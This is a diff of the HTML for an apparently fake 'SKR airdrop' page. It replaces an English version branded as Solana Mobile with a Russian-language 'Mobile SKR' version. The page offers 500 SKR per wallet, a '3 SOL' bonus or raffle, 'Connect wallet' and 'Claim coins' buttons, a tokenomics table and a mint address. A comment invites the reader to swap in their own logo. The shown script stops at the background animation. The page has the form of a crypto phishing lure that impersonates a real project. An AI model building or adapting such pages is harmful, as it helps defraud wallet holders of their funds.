@@ -1,520 +1,888 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SKR Airdrop | Solana Mobile</title>
+  <title>Mobile SKR Airdrop</title>
+
   <style>
-    :root {
-      --green-dark: #021f17;
-      --green-accent: #a0ffcb;
-      --border-soft: #1f332c;
+    :root{
+      --bg0:#070b10;
+      --bg1:#0a1017;
+      --text:#e8eef6;
+      --muted:rgba(232,238,246,.72);
+
+      --sol-a:#14f195;
+      --sol-b:#80ecff;
+      --sol-c:#a100ff;
+
+      --radius-xl:22px;
+      --radius-lg:18px;
+      --border-soft:rgba(255,255,255,.10);
+      --shadow:0 18px 60px rgba(0,0,0,.55);
     }
 
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
-        sans-serif;
-      background: linear-gradient(
-        90deg,
-        #000 0%,
-        #000 50%,
-        var(--green-dark) 50%,
-        var(--green-dark) 100%
-      );
-      color: #fff;
-      text-align: center;
-      min-height: 100vh;
-      overflow-x: hidden;
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%}
+
+    body{
+      font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+      color:var(--text);
+      background:
+        radial-gradient(1100px 700px at 50% 24%,rgba(120,170,255,.18) 0,rgba(120,170,255,0) 55%),
+        radial-gradient(900px 600px at 15% 85%,rgba(20,241,149,.12) 0,rgba(20,241,149,0) 60%),
+        radial-gradient(900px 600px at 90% 80%,rgba(161,0,255,.10) 0,rgba(161,0,255,0) 60%),
+        linear-gradient(180deg,var(--bg1),var(--bg0));
+      overflow-x:hidden;
     }
 
-    #snow-canvas {
-      position: fixed;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
+    body::before{
+      content:"";
+      position:fixed; inset:0;
+      pointer-events:none;
+      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='.18'/%3E%3C/svg%3E");
+      mix-blend-mode:overlay;
+      opacity:.35;
+      z-index:0;
     }
 
-    header {
-      position: fixed;
-      top: 18px;
-      right: 24px;
-      z-index: 10;
+    #dust{
+      position:fixed; inset:0;
+      width:100%; height:100%;
+      pointer-events:none;
+      z-index:0;
     }
 
-    .connect-btn {
-      background: var(--green-accent);
-      color: #000;
-      padding: 10px 22px;
-      font-size: 0.95rem;
-      border-radius: 999px;
-      cursor: pointer;
-      font-weight: 600;
-      border: none;
-      box-shadow: 0 0 24px rgba(160, 255, 203, 0.35);
-      transition: transform 0.12s ease, box-shadow 0.12s ease,
-        opacity 0.12s ease;
+    /* NAVBAR */
+    .nav{
+      position:fixed;
+      top:0; left:0; right:0;
+      height:72px;
+      padding:0 22px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      background:linear-gradient(180deg,rgba(10,15,20,.88),rgba(10,15,20,.24));
+      backdrop-filter:blur(10px);
+      border-bottom:1px solid rgba(255,255,255,.06);
+      z-index:10;
     }
-    .connect-btn:hover:not(:disabled) {
-      transform: translateY(-1px);
-      box-shadow: 0 0 32px rgba(160, 255, 203, 0.5);
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      font-weight:780;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      font-size:.88rem;
+      white-space:nowrap;
     }
-    .connect-btn:disabled {
-      opacity: 0.7;
-      cursor: default;
-      box-shadow: none;
-    }
-
-    .page {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 90px 20px 60px;
-      display: grid;
-      grid-template-columns: minmax(0, 1.1fr) minmax(0, 1.1fr);
-      gap: 40px;
-      align-items: flex-start;
-      position: relative;
-      z-index: 1;
+    .brand-mark{
+      width:30px;
+      height:18px;
+      border-radius:6px;
+      background:linear-gradient(90deg,var(--sol-a),var(--sol-b),var(--sol-c));
+      filter:drop-shadow(0 0 18px rgba(128,236,255,.25));
     }
 
-    .left,
-    .right {
-      text-align: left;
+    .navlinks{
+      display:flex;
+      gap:18px;
+      font-size:.92rem;
+      color:rgba(232,238,246,.78);
+    }
+    .navlinks a{
+      text-decoration:none;
+      color:inherit;
+      padding:8px 10px;
+      border-radius:999px;
+      transition:background .15s ease,color .15s ease;
+    }
+    .navlinks a:hover{
+      background:rgba(255,255,255,.07);
+      color:#fff;
     }
 
-    .skr-logo {
-      width: 220px;
-      margin: 10px 0 8px;
-      display: block;
-      filter: drop-shadow(0 0 32px rgba(160, 255, 203, 0.25));
+    .actions{
+      display:flex;
+      gap:10px;
+      align-items:center;
+      flex-wrap:wrap;
+      justify-content:flex-end;
+      max-width:60%;
+    }
+    .addr{
+      font-size:13px;
+      color:rgba(232,238,246,.65);
+      max-width:220px;
+      overflow:hidden;
+      white-space:nowrap;
+      text-overflow:ellipsis;
+    }
+    .btn{
+      border-radius:999px;
+      padding:9px 14px;
+      border:1px solid rgba(255,255,255,.16);
+      background:rgba(0,0,0,.3);
+      color:var(--text);
+      font-weight:650;
+      font-size:.9rem;
+      cursor:pointer;
+      backdrop-filter:blur(10px);
+      transition:transform .12s ease,background .12s ease,border-color .12s ease,opacity .12s ease;
+      white-space:nowrap;
+    }
+    .btn:hover:not(:disabled){
+      transform:translateY(-1px);
+      background:rgba(255,255,255,.08);
+      border-color:rgba(255,255,255,.22);
+    }
+    .btn:disabled{
+      opacity:.55;
+      cursor:not-allowed;
+      transform:none;
+    }
+    .btn-primary{
+      border:none;
+      background:linear-gradient(90deg,var(--sol-a),var(--sol-b));
+      color:#05080b;
+      box-shadow:0 0 22px rgba(20,241,149,.18);
+    }
+    .btn-primary:hover:not(:disabled){
+      background:linear-gradient(90deg,var(--sol-a),#bdf9ff);
     }
 
-    .title-block {
-      margin-top: 10px;
-      margin-bottom: 26px;
+    /* LAYOUT */
+    .wrap{
+      position:relative;
+      z-index:1;
+      max-width:1200px;
+      margin:0 auto;
+      padding:96px 18px 70px;
     }
 
-    h1 {
-      font-size: 3.4rem;
-      font-weight: 900;
-      margin: 0;
-      letter-spacing: -2px;
+    .section-title{
+      margin-bottom:12px;
+      font-size:1.1rem;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      color:var(--muted);
     }
 
-    .subtitle {
-      font-size: 1.1rem;
-      color: var(--green-accent);
-      margin: 10px 0;
-      text-transform: uppercase;
-      letter-spacing: 0.12em;
+    /* HERO S */
+    .hero{
+      border-radius:var(--radius-xl);
+      padding:54px 26px 34px;
+      background:
+        radial-gradient(900px 500px at 50% 40%,rgba(255,255,255,.06) 0,rgba(255,255,255,0) 62%),
+        rgba(255,255,255,.03);
+      border:1px solid rgba(255,255,255,.08);
+      box-shadow:var(--shadow);
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      text-align:center;
+      gap:16px;
+      overflow:hidden;
+      position:relative;
+      min-height:340px;
+    }
+    .hero::after{
+      content:"";
+      position:absolute;
+      inset:-120px;
+      background:
+        radial-gradient(closest-side,rgba(128,236,255,.14),rgba(128,236,255,0) 70%),
+        radial-gradient(closest-side,rgba(20,241,149,.12),rgba(20,241,149,0) 70%);
+      filter:blur(26px);
+      opacity:.7;
+      pointer-events:none;
     }
 
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(0, 0, 0, 0.55);
-      border-radius: 999px;
-      padding: 6px 16px;
-      font-size: 0.85rem;
-      color: var(--green-accent);
-      border: 1px solid rgba(160, 255, 203, 0.35);
-      margin-top: 8px;
+    .hero-logo{
+      width:210px;
+      max-width:60%;
+      filter:drop-shadow(0 0 26px rgba(128,236,255,.25));
+      margin-bottom:8px;
+      position:relative;
+      z-index:1;
     }
 
-    .badge strong {
-      font-weight: 700;
+    .hero-s{
+      position:relative;
+      z-index:1;
+      font-size:150px;
+      font-weight:900;
+      line-height:1;
+      letter-spacing:-.04em;
+      color:transparent;
+      background:linear-gradient(90deg,var(--sol-a),var(--sol-b),var(--sol-c),var(--sol-a));
+      background-size:240% 100%;
+      -webkit-background-clip:text;
+      background-clip:text;
+      filter:drop-shadow(0 18px 34px rgba(0,0,0,.6));
+      animation:solShift 2.6s linear infinite;
+      user-select:none;
+      margin-top:4px;
+      margin-bottom:6px;
+    }
+    .hero-s::before{
+      content:"";
+      position:absolute;
+      left:-12%;
+      right:-12%;
+      top:50%;
+      height:22%;
+      transform:translateY(-50%) skewX(-12deg);
+      background:rgba(7,11,16,.78);
+      border-radius:14px;
+      border:1px solid rgba(255,255,255,.1);
+      backdrop-filter:blur(10px);
     }
 
-    p {
-      font-size: 0.98rem;
-      line-height: 1.7;
-      color: #ddd;
-      margin: 10px 0;
+    @keyframes solShift{
+      0%{background-position:0% 50%}
+      100%{background-position:100% 50%}
     }
 
-    .highlight {
-      color: var(--green-accent);
+    .hero-sub{
+      position:relative;
+      z-index:1;
+      display:flex;
+      flex-wrap:wrap;
+      justify-content:center;
+      gap:8px;
+      font-size:.84rem;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      color:var(--muted);
+    }
+    .hero-sub span b{
+      color:#fff;
     }
 
-    .claim-card {
-      background: rgba(0, 0, 0, 0.65);
-      border-radius: 18px;
-      padding: 18px 20px;
-      border: 1px solid #222;
-      margin-top: 18px;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.65);
+    .hero-badge{
+      position:relative;
+      z-index:1;
+      margin-top:6px;
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:6px 14px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,.14);
+      background:rgba(0,0,0,.45);
+      font-size:.82rem;
+      color:var(--muted);
+    }
+    .hero-badge b{
+      color:var(--sol-a);
     }
 
-    .claim-btn {
-      background: var(--green-accent);
-      color: #000;
-      padding: 14px 28px;
-      font-size: 1rem;
-      border-radius: 999px;
-      cursor: pointer;
-      font-weight: 700;
-      border: none;
-      margin: 14px 0 4px;
-      width: 100%;
-      max-width: 280px;
-      display: inline-block;
-      text-align: center;
-      box-shadow: 0 0 24px rgba(160, 255, 203, 0.35);
-      transition: transform 0.12s ease, box-shadow 0.12s ease,
-        background 0.12s ease, opacity 0.12s ease;
-    }
-    .claim-btn:hover:not(:disabled) {
-      transform: translateY(-1px);
-      box-shadow: 0 0 32px rgba(160, 255, 203, 0.5);
-      background: #b5ffd7;
-    }
-    .claim-btn:disabled {
-      background: #444;
-      opacity: 0.6;
-      cursor: not-allowed;
-      box-shadow: none;
+    .hero-status{
+      position:relative;
+      z-index:1;
+      margin-top:10px;
+      font-size:.9rem;
+      color:var(--muted);
+      min-height:20px;
     }
 
-    #wallet-address {
-      margin-top: 6px;
-      font-size: 0.9rem;
-      color: #aaa;
+    /* GRID PANELS */
+    .grid2{
+      margin-top:22px;
+      display:grid;
+      grid-template-columns:1.1fr .9fr;
+      gap:20px;
+    }
+    .panel{
+      background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.03));
+      border-radius:var(--radius-xl);
+      border:1px solid rgba(255,255,255,.08);
+      box-shadow:var(--shadow);
+      padding:22px;
+      position:relative;
+      overflow:hidden;
+    }
+    .panel h2{
+      font-size:2.5rem;
+      margin-bottom:10px;
+      letter-spacing:-.03em;
+    }
+    .panel p{
+      font-size:.97rem;
+      line-height:1.7;
+      color:var(--muted);
+      margin-bottom:8px;
     }
 
-    #status {
-      font-size: 0.9rem;
-      min-height: 32px;
-      margin-top: 10px;
-      word-break: break-all;
-      color: #ccc;
+    .cards{
+      display:grid;
+      gap:12px;
+    }
+    .card{
+      display:flex;
+      gap:12px;
+      background:rgba(0,0,0,.3);
+      border-radius:var(--radius-lg);
+      border:1px solid rgba(255,255,255,.12);
+      padding:13px 14px;
+      backdrop-filter:blur(10px);
+    }
+    .card-icon{
+      width:34px;
+      height:34px;
+      border-radius:12px;
+      background:linear-gradient(180deg,rgba(255,255,255,.09),rgba(255,255,255,.03));
+      border:1px solid rgba(255,255,255,.14);
+      display:grid;
+      place-items:center;
+      flex:0 0 auto;
+      font-size:18px;
+    }
+    .card h4{
+      margin:0 0 5px;
+      font-size:.9rem;
+      letter-spacing:.08em;
+      text-transform:uppercase;
+    }
+    .card p{
+      margin:0;
+      font-size:.86rem;
+      line-height:1.5;
     }
 
-    .section-title {
-      font-size: 1.1rem;
-      font-weight: 700;
-      margin-top: 26px;
-      margin-bottom: 12px;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--green-accent);
+    /* INFLATION SECTION */
+    .inflation{
+      margin-top:22px;
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:20px;
+    }
+    .metric{
+      display:flex;
+      gap:10px;
+      align-items:flex-start;
+      margin-top:12px;
+    }
+    .metric-title{
+      font-weight:650;
+      font-size:.93rem;
+    }
+    .metric small{
+      display:block;
+      margin-top:2px;
+      font-size:.82rem;
+      color:var(--muted);
     }
 
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      background: rgba(5, 20, 16, 0.9);
-      border-radius: 18px;
-      overflow: hidden;
-      margin-top: 8px;
-      border: 1px solid rgba(48, 82, 70, 0.9);
+    .chart-box{
+      border-radius:var(--radius-xl);
+      border:1px solid rgba(255,255,255,.08);
+      background:rgba(0,0,0,.28);
+      padding:14px 16px 16px;
+      box-shadow:var(--shadow);
     }
-    th,
-    td {
-      padding: 12px 16px;
-      border-bottom: 1px solid #23352f;
-      font-size: 0.9rem;
-      text-align: left;
+    .chart-label{
+      font-size:.8rem;
+      letter-spacing:.16em;
+      text-transform:uppercase;
+      color:var(--muted);
+      margin-bottom:6px;
     }
-    th {
-      background: rgba(10, 34, 26, 0.95);
-      color: var(--green-accent);
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      font-size: 0.78rem;
+    .chart{
+      width:100%;
+      aspect-ratio:4/3;
     }
-    tr:last-child td {
-      border-bottom: none;
+    .chart svg{width:100%;height:100%}
+    .chart .grid line{stroke:rgba(255,255,255,.10);stroke-width:1}
+    .chart .axis{stroke:rgba(255,255,255,.26);stroke-width:1.3}
+    .chart .curve{
+      fill:none;
+      stroke:rgba(128,236,255,.9);
+      stroke-width:3.2;
+      stroke-linecap:round;
+      stroke-linejoin:round;
+      filter:drop-shadow(0 6px 14px rgba(0,0,0,.6));
+      stroke-dasharray:520;
+      stroke-dashoffset:520;
+      animation:drawCurve 1.4s ease forwards;
     }
-
-    .footer-text {
-      margin-top: 16px;
-      font-size: 0.9rem;
-      color: #b0b0b0;
-    }
-
-    .mission-section {
-      margin-top: 26px;
-      padding: 20px 20px 22px;
-      background: rgba(4, 20, 15, 0.9);
-      border-radius: 20px;
-      border: 1px solid var(--border-soft);
-      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6);
+    @keyframes drawCurve{
+      to{stroke-dashoffset:0}
     }
 
-    .mission-section h3 {
-      margin: 0 0 10px;
-      font-size: 1.05rem;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--green-accent);
+    /* TOKENOMICS */
+    .tokenomics{
+      margin-top:22px;
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:20px;
+    }
+    .pie-box{
+      border-radius:var(--radius-xl);
+      border:1px solid rgba(255,255,255,.08);
+      background:rgba(0,0,0,.28);
+      padding:18px;
+      box-shadow:var(--shadow);
+    }
+    .pie{
+      width:100%;
+      aspect-ratio:4/3;
+      display:grid;
+      place-items:center;
+    }
+    .pie svg{width:95%;height:auto}
+    .note{
+      margin-top:10px;
+      font-size:.86rem;
+      color:var(--muted);
+    }
+    table{
+      width:100%;
+      border-collapse:collapse;
+      border-radius:var(--radius-xl);
+      overflow:hidden;
+      border:1px solid rgba(255,255,255,.1);
+      background:rgba(0,0,0,.3);
+    }
+    th,td{
+      padding:11px 13px;
+      border-bottom:1px solid rgba(255,255,255,.08);
+      text-align:left;
+      font-size:.9rem;
+    }
+    th{
+      font-size:.78rem;
+      letter-spacing:.12em;
+      text-transform:uppercase;
+      color:rgba(232,238,246,.7);
+      background:rgba(255,255,255,.04);
+    }
+    tr:last-child td{border-bottom:none;}
+
+    .supply{
+      margin-top:10px;
+      font-size:.9rem;
+      color:var(--muted);
     }
 
-    .mission-section p {
-      margin: 8px 0;
-      font-size: 0.94rem;
-      color: #e2e2e2;
-    }
-
-    .mission-grid {
-      margin-top: 16px;
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 14px;
-    }
-
-    .mission-card {
-      background: rgba(0, 0, 0, 0.55);
-      border-radius: 16px;
-      padding: 12px 14px;
-      border: 1px solid #263a30;
-    }
-
-    .mission-card h4 {
-      margin: 0 0 6px;
-      font-size: 0.9rem;
-      color: var(--green-accent);
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-    }
-
-    .mission-card p {
-      margin: 0;
-      font-size: 0.86rem;
-      color: #d4d4d4;
-      line-height: 1.5;
-    }
-
-    @media (max-width: 900px) {
-      .page {
-        grid-template-columns: minmax(0, 1fr);
-        padding-top: 90px;
+    @media (max-width:980px){
+      .navlinks{display:none;}
+      .actions{max-width:100%; justify-content:flex-end;}
+      .grid2,
+      .inflation,
+      .tokenomics{
+        grid-template-columns:1fr;
       }
-      .left,
-      .right {
-        text-align: left;
-      }
-      body {
-        background: radial-gradient(circle at top, #00120d 0, #000 55%);
-      }
+      .panel h2{font-size:2.1rem;}
+      .hero-s{font-size:130px;}
     }
 
-    @media (max-width: 768px) {
-      h1 {
-        font-size: 2.4rem;
-      }
-      .subtitle {
-        font-size: 0.9rem;
-      }
-      .skr-logo {
-        width: 160px;
-      }
-      .mission-grid {
-        grid-template-columns: minmax(0, 1fr);
-      }
-      header {
-        top: 14px;
-        right: 14px;
-      }
-      .connect-btn {
-        font-size: 0.86rem;
-        padding: 8px 16px;
-      }
+    @media (max-width:640px){
+      .nav{padding:0 12px;}
+      .wrap{padding:90px 12px 60px;}
+      .hero{padding:40px 16px 28px;}
+      .hero-logo{width:160px;}
+      .nav .addr{display:none;}
+    }
+
+    @media (prefers-reduced-motion:reduce){
+      .hero-s{animation:none;}
+      .chart .curve{animation:none;stroke-dashoffset:0;}
     }
   </style>
 </head>
-<body>
-  <canvas id="snow-canvas"></canvas>
 
-  <header>
-    <button class="connect-btn" id="connect-wallet">
-      Connect Wallet
-    </button>
+<body>
+  <canvas id="dust"></canvas>
+
+  <!-- NAV -->
+  <header class="nav">
+    <div class="brand">
+      <div class="brand-mark"></div>
+      <div>Mobile SKR</div>
+    </div>
+
+    <nav class="navlinks">
+      <a href="#mission">Миссия</a>
+      <a href="#inflation">Инфляция</a>
+      <a href="#tokenomics">Токеномика</a>
+    </nav>
+
+    <div class="actions">
+      <span class="addr" id="wallet-address">Кошелёк: не подключён</span>
+      <button class="btn" id="connect-btn">Подключить кошелёк</button>
+      <button class="btn btn-primary" id="claim-btn" disabled>Забрать монеты</button>
+      <button class="btn" id="raffle-btn" disabled>Участвовать в розыгрыше 3&nbsp;SOL</button>
+    </div>
   </header>
 
-  <main class="page">
-    <section class="left">
+  <main class="wrap">
+    <!-- HERO (S + логотип) -->
+    <section class="hero">
+      <!-- можешь заменить src на свой логотип -->
       <img
         src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i"
-        alt="SKR Logo"
-        class="skr-logo"
+        alt="Mobile SKR Logo"
+        class="hero-logo"
       />
 
-      <div class="title-block">
-        <h1>SKR</h1>
-        <p class="subtitle">The Native Asset of the Solana Mobile Stack</p>
-        <span class="badge">
-          🎁 First <strong>10 wallets</strong> receive a bonus of
-          <strong>3&nbsp;SOL</strong>
-        </span>
+      <div class="hero-s" aria-hidden="true">S</div>
+
+      <div class="hero-sub">
+        <span><b>Mobile SKR</b> · собственный актив экосистемы</span>
+        <span>·</span>
+        <span>открытая мобильная платформа</span>
       </div>
 
-      <p>
-        Today’s mobile duopoly decides which apps can ship, who gets paid, and
-        which rules apply. <span class="highlight">Solana Mobile</span> is
-        building an alternative — an open, programmable mobile platform.
-      </p>
-      <p>
-        <strong>Congratulations!</strong> Your wallet may be eligible to claim
-        <span class="highlight">500&nbsp;SKR</span> from the community airdrop
-        (maximum one claim per wallet).
-      </p>
+      <div class="hero-badge">
+        🎁 Аирдроп перед пулом · <b>500&nbsp;SKR</b> за кошелёк
+      </div>
 
-      <div class="claim-card">
-        <div id="wallet-address">Connect wallet to participate</div>
-
-        <button class="claim-btn" id="claim-skr" disabled>
-          Claim 500 SKR
-        </button>
-
-        <div id="status"></div>
+      <div class="hero-status" id="status">
+        Подключи кошелёк, чтобы забрать монеты и участвовать в розыгрыше.
       </div>
     </section>
 
-    <section class="right">
-      <div>
-        <p class="section-title">Token Distribution</p>
-        <table>
-          <tr>
-            <th>Category</th>
-            <th>Allocation</th>
-            <th>Unlock Schedule</th>
-          </tr>
-          <tr>
-            <td>Airdrops</td>
-            <td class="highlight">30%</td>
-            <td>Unlocked at launch</td>
-          </tr>
-          <tr>
-            <td>Growth & Partnerships</td>
-            <td>25%</td>
-            <td>28% unlocked at launch, linear over 18 months</td>
-          </tr>
-          <tr>
-            <td>Solana Mobile Team</td>
-            <td>15%</td>
-            <td>12-month cliff, 36-month linear vest</td>
-          </tr>
-          <tr>
-            <td>Liquidity & Launch</td>
-            <td>10%</td>
-            <td>Unlocked at launch</td>
-          </tr>
-          <tr>
-            <td>Solana Labs</td>
-            <td>10%</td>
-            <td>12-month cliff, 36-month linear vest</td>
-          </tr>
-          <tr>
-            <td>Community Treasury</td>
-            <td>10%</td>
-            <td>Unlocked at launch</td>
-          </tr>
-        </table>
-
-        <p class="footer-text">
-          Total Supply: <strong>10,000,000,000 SKR</strong> • TGE: January 2026
+    <!-- МИССИЯ -->
+    <section class="grid2" id="mission">
+      <div class="panel">
+        <h2>Наша миссия</h2>
+        <p>
+          Сегодня мобильная дуополия решает, какие приложения будут доступны,
+          кто получит выплаты и какие правила действуют. Mobile SKR строит
+          открытую мобильную платформу, где управление и ценность делятся
+          между сообществом.
+        </p>
+        <p>
+          SKR — собственный актив экосистемы. Он распределяет контроль,
+          поддерживает модерацию и выравнивает стимулы между разработчиками,
+          пользователями и партнёрами по оборудованию.
+        </p>
+        <p>
+          С токеном SKR сообщество управляет развитием, а пользователи и
+          разработчики получают долю создаваемой ими стоимости.
         </p>
       </div>
 
-      <div class="mission-section">
-        <h3>Our Mission</h3>
-        <p>
-          Today’s mobile duopoly decides what ships, who gets paid, and which
-          rules apply. Solana Mobile is building an open mobile platform where
-          control is shared between developers, users, and hardware partners.
-        </p>
-        <p>
-          <span class="highlight">SKR</span> is the native asset of the Solana
-          Mobile ecosystem. It distributes control, powers moderation, and
-          aligns incentives between everyone who builds and uses the platform.
-          With SKR, the community governs the roadmap, developers are rewarded
-          for their work, and users hold a direct stake in the value they help
-          create.
-        </p>
+      <div class="panel">
+        <div class="cards">
+          <article class="card">
+            <div class="card-icon">✳</div>
+            <div>
+              <h4>Децентрализованное управление</h4>
+              <p>Стейк для стражей, которые проверяют устройства и курируют магазин приложений.</p>
+            </div>
+          </article>
+          <article class="card">
+            <div class="card-icon">☘</div>
+            <div>
+              <h4>Ответственность за экосистему</h4>
+              <p>Казна сообщества, гранты и инициативы по развитию протокола и мобильного стека.</p>
+            </div>
+          </article>
+          <article class="card">
+            <div class="card-icon">▦</div>
+            <div>
+              <h4>Согласованные стимулы</h4>
+              <p>Разработчики, пользователи и партнёры по железу делят upside от продукта.</p>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
 
-        <div class="mission-grid">
-          <div class="mission-card">
-            <h4>Decentralized Governance</h4>
-            <p>
-              Staking and governance for guardians who verify devices and curate
-              the decentralized app store.
-            </p>
+    <!-- ИНФЛЯЦИЯ -->
+    <section class="inflation" id="inflation">
+      <div class="panel">
+        <h2>Линейная инфляция</h2>
+        <p>Модель эмиссии SKR поощряет ранних участников и выходит к устойчивой ставке.</p>
+
+        <div class="metric">
+          <div class="card-icon">1</div>
+          <div>
+            <span class="metric-title">Год 1</span>
+            <small>Инфляция 10% от общего объёма (пример).</small>
           </div>
-          <div class="mission-card">
-            <h4>Ecosystem Stewardship</h4>
-            <p>
-              Community treasury, ecosystem grants, and protocol development
-              funded and directed by SKR holders.
-            </p>
+        </div>
+
+        <div class="metric">
+          <div class="card-icon">↘</div>
+          <div>
+            <span class="metric-title">Ежегодный распад</span>
+            <small>Снижение инфляции на 25% в год до целевой ставки.</small>
           </div>
-          <div class="mission-card">
-            <h4>Aligned Incentives</h4>
-            <p>
-              Developers, users, and hardware partners share in the upside of
-              the products and experiences they create together.
-            </p>
+        </div>
+
+        <div class="metric">
+          <div class="card-icon">✓</div>
+          <div>
+            <span class="metric-title">Конечная ставка</span>
+            <small>Долгосрочная инфляция 2% — поддерживает безопасность и развитие.</small>
           </div>
+        </div>
+      </div>
+
+      <div class="chart-box">
+        <div class="chart-label">Seeker · SKR Inflation Rate</div>
+        <div class="chart">
+          <svg viewBox="0 0 640 480" preserveAspectRatio="none">
+            <g class="grid">
+              <!-- вертикальные -->
+              <line x1="80" y1="40" x2="80" y2="420"></line>
+              <line x1="152" y1="40" x2="152" y2="420"></line>
+              <line x1="224" y1="40" x2="224" y2="420"></line>
+              <line x1="296" y1="40" x2="296" y2="420"></line>
+              <line x1="368" y1="40" x2="368" y2="420"></line>
+              <line x1="440" y1="40" x2="440" y2="420"></line>
+              <line x1="512" y1="40" x2="512" y2="420"></line>
+              <line x1="584" y1="40" x2="584" y2="420"></line>
+              <!-- горизонтальные -->
+              <line x1="80" y1="420" x2="600" y2="420"></line>
+              <line x1="80" y1="356" x2="600" y2="356"></line>
+              <line x1="80" y1="292" x2="600" y2="292"></line>
+              <line x1="80" y1="228" x2="600" y2="228"></line>
+              <line x1="80" y1="164" x2="600" y2="164"></line>
+              <line x1="80" y1="100" x2="600" y2="100"></line>
+              <line x1="80" y1="40" x2="600" y2="40"></line>
+            </g>
+
+            <line class="axis" x1="80" y1="40" x2="80" y2="420"></line>
+            <line class="axis" x1="80" y1="420" x2="600" y2="420"></line>
+
+            <!-- кривая (10% -> 2%) -->
+            <path class="curve"
+              d="M 80 120
+                 C 160 190, 220 250, 296 285
+                 S 430 345, 512 356
+                 S 584 360, 600 360" />
+          </svg>
+        </div>
+      </div>
+    </section>
+
+    <!-- ТОКЕНОМИКА -->
+    <section class="tokenomics" id="tokenomics">
+      <div class="pie-box">
+        <div class="chart-label">Seeker · SKR Distribution</div>
+        <div class="pie">
+          <svg viewBox="0 0 520 360">
+            <defs>
+              <linearGradient id="g1" x1="0" x2="1">
+                <stop offset="0" stop-color="rgba(20,241,149,1)" />
+                <stop offset="1" stop-color="rgba(128,236,255,1)" />
+              </linearGradient>
+              <linearGradient id="g2" x1="0" x2="1">
+                <stop offset="0" stop-color="rgba(128,236,255,0.9)" />
+                <stop offset="1" stop-color="rgba(161,0,255,0.9)" />
+              </linearGradient>
+              <linearGradient id="g3" x1="0" x2="1">
+                <stop offset="0" stop-color="rgba(255,255,255,0.6)" />
+                <stop offset="1" stop-color="rgba(255,255,255,0.15)" />
+              </linearGradient>
+            </defs>
+
+            <!-- простая "3D" диаграмма -->
+            <ellipse cx="260" cy="230" rx="150" ry="46" fill="rgba(0,0,0,.32)" />
+            <path d="M260,190 L260,90 A120,120 0 0,1 370,130 Z" fill="url(#g1)" />
+            <path d="M260,190 L370,130 A120,120 0 0,1 332,290 Z" fill="url(#g2)" />
+            <path d="M260,190 L332,290 A120,120 0 0,1 180,300 Z" fill="rgba(128,236,255,.4)" />
+            <path d="M260,190 L180,300 A120,120 0 0,1 260,90 Z" fill="url(#g3)" />
+          </svg>
+        </div>
+        <div class="note">
+          Диаграмма иллюстрирует доли: airdrop, рост и партнёрства, команда,
+          ликвидность, казначейство. Проценты смотри в таблице справа.
+        </div>
+      </div>
+
+      <div class="panel">
+        <h2>Токеномика</h2>
+        <table>
+          <tr>
+            <th>Категория</th>
+            <th>Распределение</th>
+            <th>Разблокировка</th>
+          </tr>
+          <tr>
+            <td>Аирдропы</td>
+            <td>30%</td>
+            <td>Разблокировано при запуске</td>
+          </tr>
+          <tr>
+            <td>Рост и партнёрства</td>
+            <td>25%</td>
+            <td>28% при запуске, далее линейно 18&nbsp;мес.</td>
+          </tr>
+          <tr>
+            <td>Команда Mobile SKR</td>
+            <td>15%</td>
+            <td>12-месячный cliff, 36-месячный vest</td>
+          </tr>
+          <tr>
+            <td>Ликвидность и запуск</td>
+            <td>10%</td>
+            <td>Разблокировано при запуске</td>
+          </tr>
+          <tr>
+            <td>Solana Labs / партнёры</td>
+            <td>10%</td>
+            <td>Cliff + линейный vest</td>
+          </tr>
+          <tr>
+            <td>Казначейство сообщества</td>
+            <td>10%</td>
+            <td>Управляется через голосование</td>
+          </tr>
+        </table>
+
+        <div class="supply">
+          Общий объём: <b>10&nbsp;000&nbsp;000&nbsp;000 SKR</b><br />
+          Токен: <b>Mobile SKR</b> · Mint: <code>Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh</code>
         </div>
       </div>
     </section>
   </main>
 
   <script>
-    let wallet = null;
-    let walletPubkey = null;
+    // ===== ПАРТИКЛЫ НА ФОНЕ (как "снег"/пыль) =====
+    (function () {
+      const canvas = document.getElementById("dust");
+      const ctx = canvas.getContext("2d");
+      let w, h, dpr;
 
-    const connectBtn = document.getElementById("connect-wallet");
-    const claimBtn = document.getElementById("claim-skr");
+      function resize() {
